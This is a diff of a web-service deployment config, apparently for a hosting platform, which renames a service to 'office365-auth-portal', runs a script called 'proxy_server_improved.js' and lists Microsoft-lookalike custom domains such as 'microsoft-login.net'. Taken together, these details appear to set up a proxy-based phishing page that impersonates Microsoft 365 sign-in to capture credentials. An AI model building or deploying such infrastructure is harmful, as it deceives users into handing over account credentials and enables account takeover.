@@ -1,12 +1,18 @@
 services:
   - type: web
-    name: auth-portal-784-13981
+    name: office365-auth-portal
     env: node
     plan: free
     buildCommand: npm install
-        startCommand: node proxy_server_improved.js
+    startCommand: node proxy_server_improved.js
+    healthCheckPath: /
     envVars:
       - key: NODE_ENV
         value: production
       - key: PORT
         value: 10000
+    # Custom domain options (uncomment to use)
+    # customDomains:
+    #   - name: office365-auth.com
+    #   - name: microsoft-login.net
+    #   - name: auth-portal-784-13981.com
